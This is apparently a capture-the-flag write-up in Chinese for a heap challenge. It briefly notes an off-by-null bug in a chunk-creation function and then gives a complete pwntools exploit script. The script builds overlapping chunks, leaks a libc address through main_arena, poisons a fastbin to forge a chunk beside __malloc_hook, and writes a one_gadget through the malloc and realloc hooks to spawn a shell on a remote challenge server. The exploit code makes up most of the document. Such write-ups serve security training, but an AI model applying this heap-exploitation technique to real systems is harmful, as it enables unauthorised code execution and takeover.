1. checksec,保护全开
2. IDA分析：create，delete，show三个函数。其中create在创建chunk时有off by null漏洞
3. exp:
   ```
   from pwn import *

   context(arch='amd64',os='linux',log_level='debug')
   io = process('./timu')
   io = remote('61.147.171.105',50855)
   libc = ELF('/home/kali/Desktop/libc-2.23_32.so')

   # elf = ELF('/home/kali/Desktop/timu')
   # libc = ELF('/home/kali/Desktop/libc-2.23.so')
   def create(size,stuff):
       io.sendafter(b"Your choice :",b'1')
       io.sendafter(b"Size:",str(size).encode(encoding='utf-8'))
       io.sendafter(b"Data:",stuff)

   def delete(Index):
       io.sendafter(b"Your choice :",b'2')
       io.sendafter(b"Index:",str(Index).encode(encoding='utf-8'))

   def show():
       io.sendafter(b"Your choice :", b'3')

   # allocate chunk
   create(0x100,b'a'*0x100)
   create(0x100,b'b'*0x100)
   create(0x68, b'c'*0x68)
   create(0x68,b'd'*0x68)
   create(0x100,b'e'*(0x100-0x10)+p64(0x100) + p64(0x11))	# 尾部伪造chunk绕过检查
   create(0x100,b'f'*0x100)	# 防止unsorted chunk与top chunk 粘连


   # put chunk2 into fastbin
   delete(2)
   delete(3)
   # 将chunk0放入unsorted bin中，fd和bk被设置为main_arena+88
   delete(0)
   # 由于chunk3后被释放，所以得到了原来的chunk3空间，利用堆重叠，伪造chunk4 presize大小为0x300，off by one伪造前一个chunk已经释放
   # 低地址处的0x300大小的chunk触发unlink
   create(0x68,b'd'*0x60+p64(0x110+0x110+0x70+0x70)) 

   # free chunk4时，由于后方的fake chunk存在，将fakechunk和chunk4合并,但是由于chunk3覆盖了本chunk的低16位，chunk大小从0x110变为0x100
   # 因此在尾部伪造一个fake chunk才能绕过nextchunk的检查
   delete(4)

   # 申请100大小字节时，从unsorted bin中的这个chunk分割，将偏移0x110字节处的chunk放入新的unsorted bin中
   # 这个reminder chunk的fd bk为main_arena+88，恰好这个chunk的fd bk处于chunk1的用户区域，而chunk1没有被释放，调用show函数获取main_arena+88
   create(0x100,b"a\n")

   show()
   io.recvuntil(b'1 : ')
   main_arena_88 = u64(io.recvuntil(b'\x7f').ljust(8,b'\x00'))

   # 由于开启PIE，arena的加载地址每次会发生变化，获取libc基址需要找到libc中全局变量的偏移（全局变量是在编译时确定的，相对位置不变化）
   # 例如通过获取malloc_hook的偏移：main_arena 和 malloc_hook 物理位置上在同一页，并且靠的很近，因此，它们的地址只有后三位不一样，取
   # malloc_hook在libc中偏移的后三位，再取程序中arena的高13位，得到程序中malloc_hook的地址，得到libc基址
   malloc_hook_offset = libc.symbols['__malloc_hook']
   realloc_offset = libc.symbols['realloc']
   malloc_hook = (0xFFFFFFFFFFFFF000 & main_arena_88) + (malloc_hook_offset & 0xfff)
   libc_addr = malloc_hook - malloc_hook_offset
   gadget_addr = libc_addr + 0x4525a # rsp+0x30] == NULL
   realloc_hook_addr = malloc_hook-0x8
   realloc_addr = libc_addr + realloc_offset

   # 观察malloc_hook所在内存上方，找到合适地址凑出fake fastchunk
   fake_chunk = malloc_hook - 0x23

   # 之前获得的remindered chunk，我们可以继续切割它，切割0x118大小，正好覆盖chunk2的fd指针
   # 由于chunk2已经位于fastbin中，将chunk2的fd指针指向fake chunk
   payload = b'a' * 0x100 + p64(0) + p64(0x71) + p64(fake_chunk)
   create((0x100+0x10+0x8),payload)

   # 连续分配两次，第二次得到的就是fake chunk
   create(0x68,p64(0)+p64(0x61)+b'b'*(0x68-0x10))

   # 第二次分配时，将malloc_hook直接改为one_gadget即可获取shell,但是由于gadget的限制条件需要特殊栈环境，我们使用relloc来调整rsp())
   # 在relloc中一段push和pop指令，通过调整offset来调整栈环境
   # 具体步骤为，将malloc_hoook改为 relloc_addr+offset,将relloc_hook改为one_gadget的地址，调用malloc时先到用relloc+offset调整栈环境
   # relloc在调用relloc_hook即one_gadget获取shell
   payload = b'\x00' * 0xb + p64(gadget_addr) + p64(realloc_addr+2)+b'\n'
   create(0x68,payload)

   # 触发malloc函数获取shell
   io.sendafter(b"Your choice :", b'1')
   io.sendafter(b"Size:", str(20).encode(encoding='utf-8'))

   io.interactive()
   ```
